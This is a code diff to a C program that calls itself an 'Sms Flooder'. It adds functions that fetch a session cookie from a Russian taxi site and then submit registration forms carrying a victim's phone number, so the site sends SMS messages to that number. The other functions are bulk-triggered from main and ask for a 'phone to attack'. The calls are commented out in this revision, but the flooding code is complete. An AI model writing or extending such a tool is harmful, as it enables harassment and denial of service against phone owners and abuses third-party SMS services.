@@ -210,27 +210,87 @@ void SmsMfood(char* phone) {
     curl_global_cleanup();
 }
 
+/* Taxovichkof Get Cookie funk */
+void GetCookieTaxovichkof() {
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://taxovichkof.ru/user/login");
+        chunk = curl_slist_append(chunk, "Host: taxovichkof.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk); 
+        curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "./taxovichkof-cookie.txt");
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+    }
+    curl_global_cleanup();
+}
+
+/* Taxovichkof Sms Flood func (!Have a timer on 5 minuts)*/
+void SmsTaxovichkof(char* phone) {
+    CURL *curl;
+    CURLcode res;
+    char Buf[512];
+
+    curl = curl_easy_init();
+    if(curl) {
+        struct curl_slist *chunk = NULL;
+
+        curl_easy_setopt(curl, CURLOPT_URL, "https://taxovichkof.ru/user/register");
+        chunk = curl_slist_append(chunk, "Host: taxovichkof.ru");
+        chunk = curl_slist_append(chunk, "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0");
+        chunk = curl_slist_append(chunk, "Accept: */*");
+        chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded; charset=UTF-8");
+
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
+        curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "./taxovichkof-cookie.txt");
+
+        sprintf(Buf, "Users%%5Busername%%5D=%%2B%c+(%c%c%c)+%c%c%c-%c%c%c%c&Users%%5Bpassword%%5D=", phone[0], phone[1], phone[2], phone[3], phone[4], phone[5], phone[6], phone[7], phone[8], phone[9], phone[10]);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Buf);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK)
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+        curl_easy_cleanup(curl);
+
+    }
+    curl_global_cleanup();
+}
+
 int main(void)
 {
     char phone[16];
 
     // Print Banner
     printf("\n\t------------------------\n\t|  Sms Flooder v1.2    |\n\t|----------------------|\n");
-    printf("\t| Developed by MrTavas |\n\t------------------------\n");
+    printf("\t| Developed by mrTavas |\n\t------------------------\n");
     printf("\n[?] Number format: 71231231212\n");
     printf("\n[*] Started...\n[?] Phone to attck -> ");
     scanf("%s", phone);
     
     /* Get cookies */
-    GetCookieDostaevsky();
-    
-    /* Flood */
-    SmsDelevery(phone);
-    SmsDostaevsky(phone);
-    SmsOllis(phone);
-    SmsMfood(phone);
+    // GetCookieDostaevsky();
+    // GetCookieTaxovichkof();
 
+    /* Flood */
+    // SmsDelevery(phone);
+    // SmsDostaevsky(phone);
+    // SmsOllis(phone);
+    // SmsMfood(phone);
+    // SmsTaxovichkof(phone); // 5 min timer
+
+
+
+    //system("clear");
+    printf("\n[+] Done\n");
     return 0;
 }
-
-
